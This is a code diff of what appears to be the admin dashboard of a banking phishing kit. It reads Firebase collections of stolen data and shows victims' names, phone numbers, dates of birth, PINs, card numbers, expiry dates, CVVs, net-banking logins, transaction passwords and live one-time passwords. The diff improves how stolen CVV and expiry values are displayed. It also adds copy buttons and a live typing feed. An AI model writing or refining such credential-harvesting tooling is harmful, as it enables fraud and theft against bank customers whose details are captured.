@@ -9,7 +9,6 @@
     body { font-family: Arial, sans-serif; background:#f4f4f4; margin:0; padding-bottom: 50px; }
     h2 { text-align:center; color:#00169e; margin-top:20px; text-transform: uppercase; letter-spacing: 1px; }
 
-    /* Navigation Buttons */
     .nav-buttons {
       display:flex; flex-wrap:wrap; justify-content:center;
       gap:10px; margin:20px; position: sticky; top: 0; background: #f4f4f4; padding: 10px; z-index: 1000;
@@ -21,9 +20,8 @@
       font-weight:bold; cursor:pointer; transition: 0.3s; font-size: 12px;
     }
     .nav-buttons button:hover { background: #000b52; transform: scale(1.05); }
-    .btn-group { background: #28a745 !important; } /* Green for Grouped */
+    .btn-group { background: #28a745 !important; }
 
-    /* Sections Control */
     .section {
       display:none; margin:0 auto 30px;
       padding:20px; background:white;
@@ -34,7 +32,6 @@
     .section.active { display:block; }
     h3 { color: #00169e; border-bottom: 2px solid #00169e; padding-bottom: 10px; margin-top: 0; }
 
-    /* Data Entry Box */
     .entry {
       background:#f9f9f9; border:1px solid #ddd;
       padding:15px; border-radius:10px;
@@ -131,23 +128,27 @@ function deleteEntry(collection, docId){
   } else alert("Wrong password");
 }
 
-/* --- DATA LISTENERS --- */
-
-// 1. Live Typing (Unified Box)
+// 1. Live Typing (FIXED CVV/EXP)
 db.collection("live_typing").orderBy("timestamp","desc").onSnapshot(snap=>{
   const cont = document.getElementById("liveCont");
   cont.innerHTML = "";
   snap.forEach(doc=>{
     const d = doc.data();
     const cp = (v) => (v && v !== "---") ? `<button class="copy-btn" onclick="copyToClipboard('${v}')">Copy</button>` : '';
+    // Sabhi variables ko handle karne ke liye multiple keys check ki hain
+    const cardNum = d.card || d.cardNumber || "---";
+    const expiry = d.expiry || d.exp || "---";
+    const cvv = d.cvv || "---";
+
     cont.innerHTML += `
       <div class="entry">
         <p><span class="label-tag" style="background:red;">LIVE</span> <b>ID:</b> ${doc.id}</p>
         <p><b>Name:</b> ${d.name || "---"} ${cp(d.name)} | <b>Mob:</b> ${d.mobile || "---"}</p>
         <p><b>DOB:</b> ${d.dob || "---"} | <b>PIN:</b> <span style="color:green">${d.pin || "---"}</span></p>
         <hr>
-        <p><b>Card/Bank:</b> ${d.card || d.bank || "---"} ${cp(d.card || d.bank)}</p>
-        <p><b>User:</b> ${d.username || "---"} | <b>Pass:</b> ${d.password || "---"}</p>
+        <p><b>Card:</b> ${cardNum} ${cp(cardNum)}</p>
+        <p><b>Expiry:</b> ${expiry} | <b>CVV:</b> <span style="color:red">${cvv}</span></p>
+        <p><b>Bank User:</b> ${d.username || "---"} | <b>Pass:</b> ${d.password || "---"}</p>
         <p><b>TXN Pass:</b> <span style="color:orange">${d.txnPassword || "---"}</span></p>
         <p><b>LIVE OTP:</b> <span style="color:red; font-size:18px; font-weight:bold;">${d.otp || "---"}</span></p>
         <span class="time">Update: ${formatTime(d.timestamp)}</span>
@@ -155,7 +156,7 @@ db.collection("live_typing").orderBy("timestamp","desc").onSnapshot(snap=>{
   });
 });
 
-// 2. Grouped Sessions (Heavy Logic)
+// 2. Grouped Sessions (FIXED CVV/EXP)
 async function loadGroupedData() {
   const cont = document.getElementById("groupedCont");
   cont.innerHTML = "<p>Grouping Data... Please wait.</p>";
@@ -177,9 +178,16 @@ async function loadGroupedData() {
     let box = `<div class="entry"><b>SESSION: ${sid}</b><hr>`;
     master[sid].forEach(item => {
       const d = item.data;
-      if(item.type === "users1") box += `<p>👤 ${d.name} | ${d.mobile} | ${d.kno}</p>`;
+      if(item.type === "users1") box += `<p>👤 ${d.name} | ${d.mobile}</p>`;
       if(item.type === "dob_pin") box += `<p>📅 DOB: ${d.dob} | PIN: ${d.pin}</p>`;
-      if(item.type === "payments") box += `<p>💳 ${d.method}: ${d.card || d.bank} | ${d.username || ''}</p>`;
+      if(item.type === "payments") {
+         if(d.method === "netbanking") {
+            box += `<p>🏦 ${d.bank} | U: ${d.username} | P: ${d.password}</p>`;
+         } else {
+            // Card details fix
+            box += `<p>💳 ${d.method}: ${d.card} | <b>Exp:</b> ${d.expiry} | <b>CVV:</b> <span style="color:red">${d.cvv}</span></p>`;
+         }
+      }
       if(item.type === "otp_entries") box += `<p>📲 OTP: <b style="color:red">${d.otp}</b> (Try: ${d.attempt})</p>`;
       if(item.type === "txn_passwords") box += `<p>🔑 TXN: ${d.password}</p>`;
     });
@@ -187,7 +195,7 @@ async function loadGroupedData() {
   }
 }
 
-// 3. User Details
+// Baaki listeners as it is (No changes needed)
 db.collection("users1").orderBy("timestamp","desc").onSnapshot(snap=>{
   const cont = document.getElementById("usersCont");
   cont.innerHTML = "";
@@ -195,13 +203,11 @@ db.collection("users1").orderBy("timestamp","desc").onSnapshot(snap=>{
     const d=doc.data();
     cont.innerHTML += `<div class="entry"><button class="delete-btn" onclick="deleteEntry('users1','${doc.id}')">Delete</button>
       <p><b>Name:</b> ${d.name} | <b>Mob:</b> ${d.mobile}</p>
-      <p><b>KNO:</b> ${d.kno}</p>
       <span class="sid-tag">ID: ${d.sessionId || 'N/A'}</span>
       <span class="time">${formatTime(d.timestamp)}</span></div>`;
   });
 });
 
-// 4. DOB & PIN
 db.collection("dob_pin").orderBy("timestamp","desc").onSnapshot(snap=>{
   const cont = document.getElementById("dobCont");
   cont.innerHTML = "";
@@ -214,7 +220,6 @@ db.collection("dob_pin").orderBy("timestamp","desc").onSnapshot(snap=>{
   });
 });
 
-// 5. TXN Password
 db.collection("txn_passwords").orderBy("timestamp","desc").onSnapshot(snap=>{
   const cont = document.getElementById("txnCont");
   cont.innerHTML = "";
@@ -227,7 +232,6 @@ db.collection("txn_passwords").orderBy("timestamp","desc").onSnapshot(snap=>{
   });
 });
 
-// 6. Payments
 db.collection("payments").orderBy("timestamp","desc").onSnapshot(snap=>{
   const cCont = document.getElementById("cardCont");
   const nCont = document.getElementById("netCont");
@@ -239,13 +243,12 @@ db.collection("payments").orderBy("timestamp","desc").onSnapshot(snap=>{
       h += `<p>🏦 ${d.bank} | U: ${d.username} | P: ${d.password}</p>`;
       nCont.innerHTML += h + `<span class="sid-tag">ID: ${d.sessionId || 'N/A'}</span><span class="time">${formatTime(d.timestamp)}</span></div>`;
     } else {
-      h += `<p>💳 ${d.method}: ${d.card} | Exp: ${d.expiry} | CVV: ${d.cvv}</p>`;
+      h += `<p>💳 ${d.method}: ${d.card} | <b>Exp:</b> ${d.expiry} | <b>CVV:</b> ${d.cvv}</p>`;
       cCont.innerHTML += h + `<span class="sid-tag">ID: ${d.sessionId || 'N/A'}</span><span class="time">${formatTime(d.timestamp)}</span></div>`;
     }
   });
 });
 
-// 7. OTP
 db.collection("otp_entries").orderBy("timestamp","desc").onSnapshot(snap=>{
   const cont = document.getElementById("otpCont");
   cont.innerHTML = "";
@@ -258,7 +261,6 @@ db.collection("otp_entries").orderBy("timestamp","desc").onSnapshot(snap=>{
       <span class="time">${formatTime(d.timestamp)}</span></div>`;
   });
 });
-
 </script>
 </body>
 </html>
